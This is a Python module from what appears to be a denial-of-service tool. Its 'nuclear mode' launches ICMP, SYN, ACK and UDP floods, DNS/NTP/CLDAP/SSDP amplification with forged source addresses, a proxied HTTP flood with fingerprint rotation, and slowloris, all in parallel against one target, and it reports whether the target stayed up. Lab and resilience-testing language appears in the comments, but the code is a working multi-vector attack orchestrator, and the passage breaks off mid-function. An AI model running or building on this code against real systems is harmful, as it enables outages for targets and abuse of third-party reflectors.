"""Nuclear mode: parallel execution of all attack profiles."""

from __future__ import annotations

import asyncio
import ctypes
import multiprocessing as mp
import os
import queue
import socket
import sys
import time
from dataclasses import dataclass
from typing import Any

from .models import ProfileName, RunConfig, Target, TransportKind, AttackProfile
from .cancellation import CancelReason
from .engine import EngineHooks, RunEngine
from .observation import TargetObserver, refused_connection
from .safety import PolicyViolation, SafetyGuard
from .transports import raw_capability
from .config import config_path, load_lab_config, LAB_CONFIG_NAME
from .fingerprint import FINGERPRINTS
from .h2profile import H2_PROFILES
from .proxies import ProxyListError, load_proxies
from .transports.http3_transport import aioquic_available

H2_PROFILE_KEYS = tuple(H2_PROFILES)
@dataclass(frozen=True, slots=True)
class NuclearProfile:
    """Configuration for one profile in the nuclear strike."""

    name: str
    profile: ProfileName
    transport: TransportKind
    port: int | None
    spoof: bool
    requires_admin: bool


# --------------------------------------------------------------------------
# Child -> parent messaging
# --------------------------------------------------------------------------
#
# Children are separate processes, so their stdout is interleaved with the
# parent's live progress table and with each other. Two channels are used
# instead: stdout for human-readable detail, and a queue of tagged events for
# anything the aggregator has to *act* on. The tags are what let a profile that
# has died be distinguished from one that has merely not reported yet - the
# distinction the previous bare prints could not express.


def log(message: str, profile: str | None = None) -> None:
    """Print one line of child-side detail without interleaving mid-line."""
    prefix = f"[{profile}] " if profile else ""
    print(f"{prefix}{message}", flush=True)


def emit(
    result_queue: mp.Queue,
    profile: str,
    event: str,
    **payload: Any,
) -> None:
    """Put one tagged event on the queue for the parent to act on."""
    result_queue.put({"profile": profile, "event": event, **payload})


TICK_INTERVAL_S = 0.5
"""Counter sampling cadence inside each child, matched to the parent's repaint
interval. Any slower and a running profile's numbers visibly lag the clock."""

CHILD_PROBES_ENABLED = False
"""Probes are off inside nuclear mode on purpose.

Each child would otherwise run its own prober against the *same* target at the
same time, so a strike with ten profiles would apply ten times the intended
probe load and each profile's availability figure would partly measure the other
nine. That is not a resilience score, it is self-inflicted noise.

The parent takes a single availability reading for the whole strike instead -
see ``PARENT_PROBE`` - so a nuclear run can still answer "did the target stay
up", which it previously could not at all.
"""

PARENT_PROBE_ENABLED = True
"""One prober for the whole strike, run by the parent.

The module docstring for ``CHILD_PROBES_ENABLED`` explains why the children must
not each probe. The problem with leaving it at that is that nuclear mode then
reports no availability figure whatsoever, so a strike that left the target
completely unresponsive was indistinguishable from one it shrugged off. One
prober costs one extra request per interval against the target and answers the
only question that matters about impact.
"""

PARENT_PROBE_INTERVAL_S = 0.5
PARENT_PROBE_TIMEOUT_S = 2.0
"""The probe timeout is generous relative to its interval on purpose. Under a
10,000 pps flood the target is expected to be slow, and a short timeout would
report timeouts that say more about the probe than about the target."""


def probe_udp_port(host: str, port: int, timeout: float = 0.5) -> bool:
    """True if *port* is reachable as a UDP service.

    A TCP connect is the wrong test here. A reflector answers UDP and almost
    never listens on TCP, so probing with TCP would report every reflector as
    closed and skip the very profiles worth running.

    Instead a *connected* UDP socket is used: the kernel resolves the route and,
    on a closed port, the resulting ICMP port-unreachable is reported back on the
    socket. A timeout is treated as reachable, because a filtered port and a busy
    one look identical from here and refusing to run on that evidence would be
    the wrong call.

    The specific error differs by platform, and getting this wrong makes every
    closed port look open: Linux reports ``ConnectionRefusedError``, while
    Windows reports ``ConnectionResetError`` (WSAECONNRESET). Both are
    ``ConnectionError``, which is what is caught - catching only the refused
    case silently reports dead ports as live, which is the exact failure this
    check exists to prevent.
    """
    probe = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        probe.settimeout(timeout)
        probe.connect((host, port))
        probe.send(b"\x00")
        try:
            probe.recv(1)
        except socket.timeout:
            return True
        except ConnectionError:
            return False
        except OSError:
            return True
        return True
    except ConnectionError:
        return False
    except (socket.gaierror, OSError):
        return False
    finally:
        probe.close()


#: Profiles whose packets ride a TCP connection. Everything else with a port is
#: UDP, and the two need different liveness probes - see filter_available_profiles.
_TCP_PROFILES = frozenset(
    {
        ProfileName.SYN_FLOOD,
        ProfileName.SYN_FLOOD_NS,
        ProfileName.ACK_FLOOD,
        ProfileName.ACK_FLOOD_NS,
        ProfileName.HTTP_FLOOD,
        ProfileName.SLOWLORIS,
    }
)

#: Profiles that put a connectionless datagram on the wire toward the host.
#:
#: These are exempt from the closed-port drop, and the reason is that the drop's
#: stated justification is false for them. The pre-flight tells the operator it
#: is skipping profiles because "the packets would be discarded before reaching
#: any application" - true of a SYN or an HTTP request against a port with no
#: listener, and not true of a datagram, which arrives, is charged to the
#: target's ingress bandwidth, and is dropped by the kernel afterwards. A
#: volumetric test does not need a willing application to measure load.
#:
#: What a closed reflector port does change is amplification: with no responder
#: there is nothing to amplify, and a query to it returns nothing. That is a
#: separate question with its own prompt - see the reflector check in
#: nuclear_wizard. Collapsing "may I run this" into "will it amplify" is what
#: cost a run four profiles, silently, whenever VM2 had nothing bound to the
#: reflector ports.
_CONNECTIONLESS_PROFILES = frozenset(
    {
        ProfileName.UDP_FLOOD,
        # The _NS variants send the same datagram from a real source address
        # instead of a forged one, so they are exempt for the same reason. This
        # is not a detail: declining the spoofing prompt selects _NS, so
        # omitting it here would have left the non-elevated path - the one most
        # operators actually run - still dropping its UDP flood.
        ProfileName.UDP_FLOOD_NS,
        ProfileName.DNS_AMPLIFICATION,
        ProfileName.NTP_AMPLIFICATION,
        ProfileName.CLDAP_AMPLIFICATION,
        ProfileName.SSDP_AMPLIFICATION,
    }
)


def probe_tcp_port(host: str, port: int, timeout: float = 0.5) -> bool:
    """True if *port* accepts a TCP connection.

    The complement of :func:`probe_udp_port`. HTTP and slowloris profiles
    connect over TCP, so probing them with a UDP datagram reports a live web
    service as closed and silently drops the run's only profiles that have
    independent delivery evidence.
    """
    probe = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        probe.settimeout(timeout)
        probe.connect((host, port))
        return True
    except (socket.gaierror, OSError):
        return False
    finally:
        probe.close()


def filter_available_profiles(
    profiles: list[NuclearProfile],
    host: str,
) -> tuple[list[NuclearProfile], list[tuple[str, str]]]:
    """Drop profiles aimed at a port with nothing listening.

    Sending at a closed port is not a weaker test, it is no test at all: the
    packets are discarded by the host before any application sees them, and the
    result is indistinguishable from a successful run at a target that ignored
    the load. Skipping them is reported rather than done silently.

    Each profile is probed on the protocol it actually uses. A UDP datagram is
    the right test for a reflector and the wrong one for a web server: probing
    TCP with UDP reports a live HTTP target as closed, and a silent drop here
    is worse than an honest failed run because the strike still looks like it
    did something.

    Datagram profiles are kept even when the probe fails - see
    :data:`_CONNECTIONLESS_PROFILES` for why, and for where the amplification
    question is actually asked.
    """
    keep: list[NuclearProfile] = []
    skipped: list[tuple[str, str]] = []

    for profile in profiles:
        # ICMP has no port, and a raw-socket profile will fail loudly anyway.
        if profile.port is None:
            keep.append(profile)
            continue
        if profile.profile in _CONNECTIONLESS_PROFILES:
            keep.append(profile)
            continue
        # Probed by transport, not by profile alone. HTTP_FLOOD rides TCP on the socket
        # and h2 transports but UDP on h3, so a profile-only lookup TCP-probes an
        # h3 target, finds nothing listening on TCP, and skips the one profile
        # the operator actually asked for - which reads as "h3 is unsupported"
        # rather than as a bug.
        if (
            profile.transport is TransportKind.H3
            or profile.profile not in _TCP_PROFILES
        ):
            reachable = probe_udp_port(host, profile.port)
        else:
            reachable = probe_tcp_port(host, profile.port)
        if reachable:
            keep.append(profile)
        else:
            skipped.append((profile.name, f"{host}:{profile.port} is closed"))

    return keep, skipped


def _drop_privilege_profiles(profiles: list[NuclearProfile]) -> list[NuclearProfile]:
    """Remove the profiles that need a forged source, naming each one.

    The old wording was a count - "Skipping 4 raw profiles" - which reads as
    though the four were interchangeable and as though raw sockets were the only
    thing missing. They are not the same thing: every dropped profile is here
    because it needs a *forged source address*, which is why answering ``n`` to
    the spoofing prompt forfeits the four amplification profiles even when the
    process is already root. Naming them, and saying what would bring them
    back, is the difference between a run the operator can interpret and one
    that silently came back short.
    """
    kept: list[NuclearProfile] = []
    dropped: list[NuclearProfile] = []
    for profile in profiles:
        (dropped if profile.requires_admin else kept).append(profile)

    if not dropped:
        return kept

    print(
        f"   {len(dropped)} of {len(profiles)} profiles need a forged source "
        f"address and are not running:"
    )
    for profile in dropped:
        print(f"      - {profile.name}")
    print(
        "     Run as root and answer y to the spoofing prompt to include them."
    )
    print(f"   Running {len(kept)} of {len(profiles)} profiles.\n")
    return kept


def check_privileges() -> tuple[bool, bool]:
    """Check if running as Admin and if raw sending is available.

    Returns ``(is_admin, raw_capable)`` where ``raw_capable`` reflects
    :func:`raw_capability().can_send` — i.e. whether *this process* can send
    raw packets. The old name ``has_npcap`` was misleading because it was
    ``False`` on a non-elevated terminal even when Npcap was installed.
    """
    is_admin = False
    try:
        if sys.platform == "win32":
            is_admin = bool(ctypes.windll.shell32.IsUserAnAdmin())
        else:
            # On Linux/Unix, root (uid 0) is equivalent to Administrator
            is_admin = os.geteuid() == 0
    except Exception:
        pass

    cap = raw_capability()
    raw_capable = cap.can_send

    return is_admin, raw_capable


def _child_capability_worker(q: mp.Queue) -> None:
    """Worker for check_child_raw_capability; must be top-level for pickling."""
    from adobo.transports import raw_capability
    cap = raw_capability()
    q.put((cap.can_send, cap.reason))


def check_child_raw_capability() -> tuple[bool, str]:
    """Check raw capability from inside a spawned child process.

    On Windows a ``spawn`` child may not inherit the parent's elevation
    (the PyInstaller re-exec path does not always preserve the token).
    This runs the same capability check the child will run, so the wizard
    skips profiles that *actually* cannot send instead of relying on the
    parent's token.
    """
    ctx = mp.get_context("spawn")
    result_queue: mp.Queue = ctx.Queue()

    p = ctx.Process(target=_child_capability_worker, args=(result_queue,))
    p.start()
    p.join(timeout=5.0)
    if p.is_alive():
        p.terminate()
        p.join()
        return False, "child process did not respond in time"
    try:
        return result_queue.get_nowait()
    except Exception:
        return False, "child capability check failed"


def build_profiles(
    target_ip: str,
    wizard_port: int,
    reflector_ports: dict[str, int] | int,
    enable_spoofing: bool = False,
    use_http2: bool = False,
    use_http3: bool = False,
    proxy_file: str = "",
) -> list[NuclearProfile]:
    """Build the nuclear profiles from wizard input.

    Only *use_http2* affects the result: it picks the transport for the HTTP
    profile. Per-child tuning (workers, payload size, keep-alive, TLS, h2
    concurrency) is deliberately *not* accepted here. NuclearProfile is a frozen
    routing record with no transport-tuning fields, so such arguments would be
    accepted and silently discarded - which is exactly what happened: the wizard
    asked for workers and payload size, they were passed here, and they went
    nowhere. Those values are carried by NuclearAggregator and set on each
    child's AttackProfile instead.

    *reflector_ports* can be either:
    - A dict mapping protocol names to reflector ports:
      - DNS: port 53
      - NTP: port 123
      - CLDAP: port 389
      - SSDP: port 1900
    - Or a single int (legacy API) used for all amplification profiles.

    These must be reflectors the operator controls. Without a valid reflector
    on the correct port, amplification profiles will only send requests at
    low rate with no amplification.

    *proxy_file*, when set, routes the http_flood profile through that list.
    Every other profile keeps its own transport: they are UDP floods,
    amplification queries or raw L3/L4 packets, and an HTTP CONNECT tunnel can
    carry none of them. The wizard says which profiles are affected so a
    partially-distributed strike is not read as a wholly distributed one.
    """
    # Normalize reflector_ports to a dict
    if isinstance(reflector_ports, int):
        reflector_ports_dict = {
            "dns": reflector_ports,
            "ntp": reflector_ports,
            "cldap": reflector_ports,
            "ssdp": reflector_ports,
        }
    else:
        reflector_ports_dict = reflector_ports
    # Choose transport and profile variants based on spoofing preference
    if enable_spoofing:
        raw_transport = TransportKind.SCAPY
        icmp_profile = ProfileName.ICMP_FLOOD
        syn_profile = ProfileName.SYN_FLOOD
        ack_profile = ProfileName.ACK_FLOOD
        udp_profile = ProfileName.UDP_FLOOD
        raw_spoof = True
        raw_requires_admin = True
    else:
        raw_transport = TransportKind.LINUX_RAW
        icmp_profile = ProfileName.ICMP_FLOOD_NS
        syn_profile = ProfileName.SYN_FLOOD_NS
        ack_profile = ProfileName.ACK_FLOOD_NS
        udp_profile = ProfileName.UDP_FLOOD_NS
        raw_spoof = False
        raw_requires_admin = False

    return [
        NuclearProfile(
            name="icmp_flood",
            profile=icmp_profile,
            transport=raw_transport,
            port=None,
            spoof=raw_spoof,
            requires_admin=raw_requires_admin,
        ),
        NuclearProfile(
            name="syn_flood",
            profile=syn_profile,
            transport=raw_transport,
            port=wizard_port,
            spoof=raw_spoof,
            requires_admin=raw_requires_admin,
        ),
        NuclearProfile(
            name="ack_flood",
            profile=ack_profile,
            transport=raw_transport,
            port=wizard_port,
            spoof=raw_spoof,
            requires_admin=raw_requires_admin,
        ),
        NuclearProfile(
            name="dns_amplification",
            profile=ProfileName.DNS_AMPLIFICATION,
            transport=TransportKind.SCAPY,
            port=reflector_ports_dict.get("dns", 53),
            spoof=True,
            requires_admin=True,
        ),
        NuclearProfile(
            name="ntp_amplification",
            profile=ProfileName.NTP_AMPLIFICATION,
            transport=TransportKind.SCAPY,
            port=reflector_ports_dict.get("ntp", 123),
            spoof=True,
            requires_admin=True,
        ),
        NuclearProfile(
            name="cldap_amplification",
            profile=ProfileName.CLDAP_AMPLIFICATION,
            transport=TransportKind.SCAPY,
            port=reflector_ports_dict.get("cldap", 389),
            spoof=True,
            requires_admin=True,
        ),
        NuclearProfile(
            name="ssdp_amplification",
            profile=ProfileName.SSDP_AMPLIFICATION,
            transport=TransportKind.SCAPY,
            port=reflector_ports_dict.get("ssdp", 1900),
            spoof=True,
            requires_admin=True,
        ),
        NuclearProfile(
            name="udp_flood",
            profile=udp_profile,
            transport=raw_transport,
            port=wizard_port,
            spoof=raw_spoof,
            requires_admin=raw_requires_admin,
        ),
        NuclearProfile(
            name="http_flood",
            profile=ProfileName.HTTP_FLOOD,
            # PROXY selects ProxyH2Transport or ProxyTransport in the factory
            # based on use_http2, which rides on the AttackProfile rather than
            # here. Only this profile is proxied: every other one below is UDP or
            # a raw packet, and neither can be carried by an HTTP tunnel. Saying
            # so in the wizard is better than quietly leaving nine profiles
            # unproxied in a run the operator believes is entirely distributed.
            transport=(
                TransportKind.PROXY
                if proxy_file
                else TransportKind.H3
                if use_http3
                else TransportKind.H2
                if use_http2
                else TransportKind.SOCKET
            ),
            port=wizard_port,
            spoof=False,
            requires_admin=False,
        ),
        NuclearProfile(
            name="slowloris",
            profile=ProfileName.SLOWLORIS,
            transport=TransportKind.SOCKET,
            port=wizard_port,
            spoof=False,
            requires_admin=False,
        ),
    ]


def run_profile_process(
    config: RunConfig,
    result_queue: mp.Queue,
) -> None:
    """Run a single profile in a subprocess.

    Every failure path emits an event. A child that dies without one leaves the
    parent with an indistinguishable "still starting" profile until the clock
    runs out, which is exactly the failure this function exists to prevent.
    """
    label = config.label

    # Crash log file in temp dir - survives process death for debugging
    import atexit
    import tempfile
    crash_log = os.path.join(tempfile.gettempdir(), f"adobo_crash_{label}.log")

    def _write_crash(msg: str) -> None:
        try:
            with open(crash_log, "a", encoding="utf-8") as f:
                f.write(f"{time.time()} {msg}\n")
        except Exception:
            pass

    atexit.register(lambda: _write_crash(f"{label} exited normally"))

    try:
        log(
            f"start transport={config.transport.value} target={config.target} "
            f"pps={config.attack.pps} for {config.attack.duration_seconds}s",
            label,
        )
        emit(result_queue, label, "started")

        # Worker errors used to be collected and dropped, so a profile whose
        # transport refused to open looked identical to one that was busy. The
        # hook surfaces the reason the moment it happens.
        def _report(exc: BaseException) -> None:
            log(f"ERROR {type(exc).__name__}: {exc}", label)
            emit(result_queue, label, "failed", error=f"{exc!r}")

        # Live counters. Without these the parent's table shows zero for every
        # profile until it finishes, because a running child has no result yet -
        # the table looked broken even while the run was working correctly.
        last_sent = [-1]

        def _tick(snapshot: Any) -> None:
            sent = snapshot.counters.sent
            if sent == last_sent[0]:
                return
            last_sent[0] = sent
            emit(
                result_queue,
                label,
                "progress",
                sent=sent,
                pps=snapshot.achieved_pps(),
                elapsed=snapshot.elapsed,
            )

        engine = RunEngine(
            config,
            hooks=EngineHooks(on_tick=_tick, on_worker_error=_report),
            # Matched to the parent's repaint interval so a running profile's
            # counters move on every frame instead of every other one.
            sample_interval_s=TICK_INTERVAL_S,
            enable_probes=CHILD_PROBES_ENABLED,
            # The parent takes one /stats reading for the whole strike. Ten
            # children each reading it would apply ten times the intended probe
            # load to a target that is already saturated, and all ten would lose
            # the race to answer.
            observe_target=False,
        )
        outcome = engine.run()

        attack = outcome.result.attack
        sent = attack.packets_sent
        attempted = attack.packets_attempted
        errors = attack.errors
        log(
            f"done sent={sent:,} pps={attack.achieved_pps:,.0f} errors={errors:,}",
            label,
        )

        # A run that sent nothing has not succeeded, whatever engine.run()
        # returned. It either was stopped before it could send, or the transport
        # was never usable and the notes explain why - and those notes are the
        # only place that reason exists, so they travel with the result instead
        # of being dropped on the way back to the parent.
        reasons = [note for note in outcome.notes if note]
        if outcome.abandoned:
            reasons.insert(0, "the run was abandoned before it could finish")
        elif outcome.reason is CancelReason.ERROR:
            # The notes already carry the setup failure verbatim. Prefixing this
            # would bury it, and "cancelled" would misdescribe an error.
            if not reasons:
                reasons.insert(0, "the run stopped on an error before it could send")
        elif outcome.cancelled:
            reasons.insert(0, f"the run was cancelled: {outcome.reason.value}")

        if sent > 0 and not outcome.cancelled:
            success = True
            error = None
        else:
            success = False
            if sent == 0:
                reasons.insert(0, "no packet was ever sent")
            error = "; ".join(reasons) or "the run ended without sending a packet"

        emit(
            result_queue,
            label,
            "finished",
            success=success,
            result=outcome.result,
            error=error,
            attempted=attempted,
            errors=errors,
        )
    except BaseException as exc:  # noqa: BLE001 - a child must always report
        import traceback

        detail = f"{exc}\n{traceback.format_exc()}"
        log(f"FAILED {type(exc).__name__}: {exc}", label)
        _write_crash(f"CRASH: {detail}")
        emit(result_queue, label, "failed", success=False, result=None, error=detail)


class NuclearAggregator:
    """Manages parallel execution and aggregates results."""

    def __init__(
        self,
        profiles: list[NuclearProfile],
        target_ip: str,
        pps: int,
        duration: float,
        payload_size: int = 512,
        workers: int = 4,
        keep_alive: bool = False,
        use_tls: bool = False,
        tls_verify: bool = True,
        use_http2: bool = False,
        h2_concurrency: int = 100,
        use_http3: bool = False,
        fingerprint: str = "",
        fingerprint_rotation: str = "",
        h2_preamble: str = "",
        proxy_file: str = "",
    ):
        self.profiles = profiles
        self.target_ip = target_ip
        self.pps = pps
        self.duration = duration
        self.payload_size = payload_size
        self.workers = workers
        # HTTP-layer options. The transport layer reads these off the
        # AttackProfile, so the aggregator has to carry them here and set them
        # per child. NuclearProfile is a frozen routing record and deliberately
        # has no transport-tuning fields, so these values cannot ride along on
        # the profiles themselves.
        self.keep_alive = keep_alive
        self.use_tls = use_tls
        self.tls_verify = tls_verify
        self.use_http2 = use_http2
        self.h2_concurrency = h2_concurrency
        self.use_http3 = use_http3
        # Identity and egress options. Empty strings mean "not requested", which
        # is what keeps a strike that asks for none of these byte-identical to
        # one from before the features existed: the child's AttackProfile falls
        # back to its own defaults, and RunConfig treats "" as no proxy list.
        self.fingerprint = fingerprint
        self.fingerprint_rotation = fingerprint_rotation
        self.h2_preamble = h2_preamble
        self.proxy_file = proxy_file

        # Use spawn context for Windows compatibility
        self._ctx = mp.get_context('spawn')
        self.result_queue: mp.Queue = self._ctx.Queue()
        self.processes: list[mp.Process] = []
        self.start_time: float = 0
        self.results: dict[str, dict] = {}
        # Live counters, keyed by label. Kept apart from results so a running
        # profile's numbers never masquerade as a finished measurement.
        self.progress: dict[str, dict] = {}
        # Labels that have announced themselves. A profile in here but not in
        # results is genuinely running, which is a different thing from a profile
        # that has not managed to start at all.
        self.started: set[str] = set()
        # Terminal failures, outranking anything the same child reports later.
        self.failures: dict[str, dict] = {}
        # Target-side observation, one reading either side of the whole strike.
        self._observer: TargetObserver | None = None
        self._stats_before: tuple[int, int] | None = None
        self._stats_after: tuple[int, int] | None = None
        self._probe_total = 0
        self._probe_ok = 0
        # Why the probes failed, and how often. A bare ok/total pair cannot tell
        # "the target collapsed" from "there was never an HTTP service to
        # collapse", and those demand opposite conclusions, so the reason for
        # each failure is recorded rather than discarded.
        self._probe_failures: dict[str, int] = {}
        self._last_probe = 0.0

    @staticmethod
    def _label(profile: NuclearProfile) -> str:
        """The key a profile's events arrive under.

        Both sides of the queue must agree on this or the aggregator reads
        nothing back and every profile looks unstarted forever. It is derived
        here, once, from the same object the profile list is built from.
        """
        return f"nuclear-{profile.name}"

    def _drain(self) -> None:
        """Absorb every event currently queued, without blocking."""
        while True:
            try:
                event = self.result_queue.get_nowait()
            except queue.Empty:
                return
            self._absorb(event)

    def _absorb(self, event: dict) -> None:
        """Fold one event into the aggregator's state.

        Progress is transient and never a result; start events are kept apart
        from terminal ones, because a late "started" overwriting a finished
        result would silently discard real measurements.

        A terminal *failure* outranks a later terminal *success* from the same
        child. A profile whose transport cannot be opened emits "failed" with
        the real reason, and then still emits "finished" when ``engine.run()``
        returns normally - it has no exception to raise. Letting that second
        event overwrite the first turned a run that sent nothing into a clean
        success, which is how seven raw profiles came to read as silent no-ops
        while the actual error was printed and then thrown away.
        """
        label = event["profile"]
        kind = event["event"]
        if kind == "progress":
            self.progress[label] = event
            return
        if kind == "started":
            self.started.add(label)
            return
        self.started.discard(label)
        if kind == "failed":
            self.failures[label] = event
        elif label in self.failures:
            return
        self.results[label] = event

    def _progress_loop(self) -> None:
        """Display live progress until duration expires or all processes finish."""
        last_update = 0
        total_profiles = len(self.profiles)

        while time.time() - self.start_time < self.duration:
            now = time.time()
            if now - last_update >= 0.5:
                elapsed = now - self.start_time
                remaining = max(0, self.duration - elapsed)

                self._drain()

                # Check for completed processes
                alive_count = sum(1 for p in self.processes if p.is_alive())
                if alive_count == 0 and len(self.results) >= total_profiles:
                    break

                self._probe_target()
                self._print_progress(elapsed, remaining)
                last_update = now

        # Deliberately no final collection and no final table here. Children may
        # still be running at the deadline; reaping them is what decides which
        # results exist, so the caller drains first and prints afterwards.

    def _probe_target(self) -> None:
        """One availability sample from the parent, against the target itself.

        A failed probe is recorded as a failed sample rather than raised: whether
        the target is still answering is the measurement, so an unreachable target
        is data here, not a fault. Bounded by the probe timeout, and skipped
        entirely if the previous sample is still within the interval.
        """
        if not PARENT_PROBE_ENABLED or self._observer is None:
            return
        now = time.monotonic()
        if now - self._last_probe < PARENT_PROBE_INTERVAL_S:
            return
        self._last_probe = now
        self._probe_total += 1
        try:
            if asyncio.run(self._observer.alive(PARENT_PROBE_TIMEOUT_S)):
                self._probe_ok += 1
        except Exception:  # noqa: BLE001 - defensive; alive() already swallows
            pass
        # alive() never raises, so reaching here with a failure means it
        # returned False and left the reason behind. Counted by reason so the
        # report can separate a refused connection from a timeout instead of
        # reporting both as the same indistinguishable 0%.
        if self._probe_total > self._probe_ok:
            self._record_probe_failure()

    def _record_probe_failure(self) -> None:
        """Attribute the most recent failed probe to a reason.

        The exception text is reduced to its type name so the same failure
        collapses to one key. A raw message would differ per attempt - errno
        text, ports, timeouts - and the tally would fill with near-duplicates
        that no reader could sum.
        """
        error = getattr(self._observer, "last_probe_error", None)
        if not error:
            key = "unknown"
        else:
            key = error.split(":", 1)[0].strip() or "unknown"
        self._probe_failures[key] = self._probe_failures.get(key, 0) + 1

    def _probe_failures_had_timeouts(self) -> bool:
        """True when any probe failure was a timeout rather than a refusal.

        Only used to pick the wording of the ambiguous case. A timeout is the
        reason worth naming explicitly, because it is the one a reader is most
        likely to misread as a dead target; the distinction is about honesty of
        phrasing, not about deciding anything.
        """
        return any(
            "timeout" in key.lower() for key in self._probe_failures
        )

    def _refused_count(self) -> int:
        """How many failed probes were refused connections."""
        return sum(
            count
            for key, count in (self._probe_failures or {}).items()
            if refused_connection(key)
        )

    def _no_http_surface(self) -> bool:
        """True when the probes indicate no HTTP service was ever there.

        Requires every failure to be a refusal. A single refused connection is
        weak on its own - it could be a connection-limit artefact, or the target
        briefly dropping a backlog - and a handful of refusals among many
        timeouts says very little, because a service under load can refuse some
        connections while timing out others.

        A run where *every* probe was refused has established something the
        reader needs: nothing was listening on that port for the whole run.

        This is deliberately a different question from whether the target
        collapsed, and the two are reported separately. Conflating them was the
        original defect. The 100% threshold is nonetheless relaxed in one
        direction by :meth:`_refusals_dominate`, so that an overwhelming
        majority of refusals still informs the surface question instead of
        being discarded by a single outlier - but the relaxed reading is always
        labelled as an inference rather than a fact.
        """
        if not self._probe_total or self._probe_ok:
            return False
        return self._refused_count() == self._probe_total - self._probe_ok

    def _refusals_dominate(self) -> bool:
        """True when refusals are the overwhelming majority of all probes.

        Set for the real phone run: 82 refusals against 1 timeout out of 83
        probes, where no probe ever succeeded. The old strict test reported the
        fully-ambiguous branch there, so the 82 refusals - which settle the
        surface question - never reached the reader, and the report implied the
        tool knew nothing when it knew almost everything.

        The threshold is high on purpose. This is a reporting convenience, not
        a new inference: a run that answered some probes and then refused the
        rest has not established the absence of a service, it has established
        that a service stopped answering, which is a different and stronger
        finding. Hence the requirement that nothing succeeded.
        """
        if not self._probe_total or self._probe_ok:
            return False
        if self._no_http_surface():
            return True
        failed = self._probe_total - self._probe_ok
        if not failed:
            return False
        return self._refused_count() / failed >= 0.95

    def _print_availability(self) -> None:
        """Report probe availability without claiming more than it measured.

        A 0% figure is ambiguous on its own, and behind it sit two independent
        questions that often have *different* answers:

        1. Did the target serve the probed endpoint at all? A refusal answers
           this - nothing was listening.
        2. Did the target stop answering under load? Only a target that answered
           and then did not answers this.

        A run against a device with no web server scores 0% for a reason that
        has nothing to do with load, and reporting that as an outage claims a
        result the measurement cannot support. So each question is answered only
        as far as the evidence reaches, and where the evidence runs out the
        report says so rather than filling the gap with a plausible story.
        """
        if not self._probe_total:
            return
        pct = 100.0 * self._probe_ok / self._probe_total
        print()
        print("Target availability (probed by the parent during the strike):")
        print(
            f"  {pct:.0f}%  ({self._probe_ok} of {self._probe_total} "
            f"probes answered)"
        )

        if pct == 100.0:
            return

        # Every claim below is derived from the tallies rather than from which
        # branch is taken. An earlier version asserted "no probe was refused"
        # in its fallback branch without checking, and that sentence is simply
        # untrue in a run like 1 answered / 99 refused.
        failed = self._probe_total - self._probe_ok
        refused = self._refused_count()

        if not self._probe_ok and self._refusals_dominate():
            # Question 1: nothing was ever listening. Either every failure was a
            # refusal, or refusals were so overwhelming that the few outliers
            # cannot outweigh them - reported as an inference in that case,
            # because one timeout in 83 is still a timeout.
            if failed == refused:
                print(
                    "  Every probe was refused, so the target served no HTTP "
                    "endpoint on this port at any point in the run. Availability "
                    "cannot be measured against a service that was never there."
                )
            else:
                print(
                    f"  {refused} of the {failed} failed probes were refused, so "
                    f"the target most likely served no HTTP endpoint on this port. "
                    f"Availability cannot be measured against it."
                )
                print(
                    f"  The remaining {failed - refused} failure(s) were not "
                    f"refusals, so this is an inference from the majority rather "
                    f"than a fact about every sample."
                )
            print(
                "  The 0% above is NOT evidence that the target failed under load, "
                "and nothing here should be read as a measured outage."
            )
        else:
            # Something was reachable at some point in the run.
            if self._probe_ok:
                print(
                    f"  {self._probe_ok} of {self._probe_total} probes were "
                    f"answered, so an HTTP service did exist on this port."
                )
            elif not refused:
                # The important negative case. No probe was answered and nothing
                # came back as a refusal, so every failure was silence. Silence
                # is genuinely uninformative: a filtered port, a service that
                # was already down, and an unreachable host all look identical
                # from here. An earlier draft of this branch claimed "the port
                # was accepting connections", which a timeout cannot establish -
                # that is precisely the kind of claim this report exists to
                # avoid making.
                if self._probe_failures_had_timeouts():
                    print(
                        "  No probe was answered and none was refused, so every "
                        "failure was silence. Silence cannot distinguish a "
                        "filtered port from a target that was already down or "
                        "unreachable, and this run does not claim to tell those "
                        "apart."
                    )
                else:
                    print(
                        "  No probe was answered and none was refused. The "
                        "recorded failure reasons are not ones this tool knows "
                        "how to interpret, so no conclusion is drawn about "
                        "whether the target was reachable at all."
                    )
            else:
                # A refusal is a real packet back from the target, so it does
                # establish that the host was alive and the path worked at those
                # moments - which rules out "the target was down the whole time".
                print(
                    f"  No probe was answered, but {refused} of the {failed} "
                    f"failures were refused connections, which means the target "
                    f"host was alive and its network path worked at those moments. "
                    f"It was not down for the whole run."
                )
                if self._probe_failures_had_timeouts():
                    print(
                        f"  The remaining {failed - refused} failure(s) were "
                        f"timeouts. A target that answers some probes with a "
                        f"refusal and others with silence is consistent with a "
                        f"service that stopped accepting connections partway "
                        f"through the run, but a timeout cannot confirm that "
                        f"rather than a connection that was dropped while "
                        f"overloaded."
                    )
                else:
                    print(
                        f"  The remaining {failed - refused} failure(s) were "
                        f"neither refusals nor timeouts, so nothing further is "
                        f"concluded about them."
                    )

        # Question 2: did it stop answering? Only answerable if it answered.
        if self._probe_ok:
            print(
                f"  Separately, the target answered {self._probe_ok} of "
                f"{self._probe_total} probes and stopped answering some, which "
                f"is consistent with real degradation under load."
            )

        if self._probe_failures:
            breakdown = ", ".join(
                f"{count}x {key}"
                for key, count in sorted(
                    self._probe_failures.items(), key=lambda kv: -kv[1]
                )
            )
            print(f"  Probe failure reasons: {breakdown}")

    def _print_progress(self, elapsed: float, remaining: float) -> None:
        """Print live progress table."""
        # Clear screen and move cursor to top
        print("\033[2J\033[H", end="")

        print("=== Nuclear Strike Active ===")
        print(f"Target: {self.target_ip} | PPS/profile: {self.pps} | Duration: {self.duration}s")
        print(f"Elapsed: {elapsed:.1f}s / {self.duration}s | Remaining: {remaining:.1f}s")
        print()

        header = f"{'Profile':<25} {'PPS':>6} {'Handed to OS':>13} {'Amp':>9} Status"
        print(header)
        print("-" * len(header))

        total_sent = 0
        contributing = 0
        for profile in self.profiles:
            result = self.results.get(self._label(profile))
            if result and result.get("success"):
                stats = result["result"].attack
                sent = stats.packets_sent
                amp_str = stats.amplification_display()
                # A profile that opened, ran, and sent nothing is not a success.
                # Rendering it as [DONE] is what made seven scapy profiles look
                # like completed work while every one of them sent zero packets.
                if sent > 0:
                    status = "[DONE]"
                    total_sent += sent
                    contributing += 1
                else:
                    status = "[EMPTY] sent nothing"
            elif result:
                sent = 0
                amp_str = "-"
                status = "[ERROR]"
